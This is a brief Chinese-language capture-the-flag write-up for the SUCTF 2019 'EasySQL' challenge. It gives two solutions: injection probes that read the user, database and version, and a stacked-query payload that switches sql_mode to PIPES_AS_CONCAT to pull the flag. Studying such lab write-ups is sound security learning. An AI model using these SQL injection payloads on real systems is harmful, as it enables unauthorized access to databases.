# [SUCTF 2019]EasySQL

## 解法一
`query=true%23` 返回1

`query=false%23` 返回0

`query=user()%23` 获取到用户名：root@localhost

`query=database()%23` 获取到数据库名：ctf

`query=version()%23` 获取到数据库版本：10.3.18-MariaDB

尝试Fuzz发现过滤了大部分关键字，而且大小写不敏感

尝试`query=1,2,3,4%23`发现返回一个长度为4的array

尝试用*获取`query=*,2`，get flag

## 解法二
这道题的考点其实是一个 sql_mode 参数

Oracle 在缺省情况下支持使用 " || "连接字符串 ， 但是在MySQL中缺省不支持 ，MySQL 缺省使用 CONCAT 系列函数来连接字符串 .

可以通过修改 sql_mode 模式 : PIPES_AS_CONCAT 来实现将 " || "视为 字符串连接符 而非 或 运算符 .

因此这里预期的 Payload 是通过修改 sql_mode 来拿到 Flag ，如下

Payload: `1;set sql_mode=PIPES_AS_CONCAT;select 1`

拼接后就变成了 `select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag FROM Flag`

成功拿到 Flag